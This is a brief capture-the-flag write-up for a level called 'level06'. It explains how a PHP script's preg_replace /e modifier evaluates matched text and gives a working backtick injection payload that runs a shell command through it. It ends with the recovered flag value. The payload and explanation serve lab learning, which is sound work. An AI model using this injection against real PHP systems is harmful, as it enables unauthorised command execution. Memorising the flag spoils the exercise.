# level06

`ls`
![[ls.png]]

`cat level06.php`
```php
#!/usr/bin/php
<?php
	function y($m) {
		$m = preg_replace("/\./", " x ", $m);
		$m = preg_replace("/@/", " y", $m);
		return $m;
	}
	function x($y, $z) {
		$a = file_get_contents($y);
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
		$a = preg_replace("/\[/", "(", $a);
		$a = preg_replace("/\]/", ")", $a);
		return $a;
	}
	$r = x($argv[1], $argv[2]);
	print $r;
?>
```
> /e modifier in preg_replace allows to execute code that's corresponds to the regex. For example, in this case, `[x hello]` would execute `y("hello")`

``echo '[x {${`getflag`}}]' > /tmp/script``
`./level06 /tmp/script`
![[flag.png]]
> Basically tries to get a var named like the result of getflag. It doesn't exist but gives us the error message containing the name of the non existing var (result of getflag)

### Flag = wiok45aaoguiboiki2tuin6ub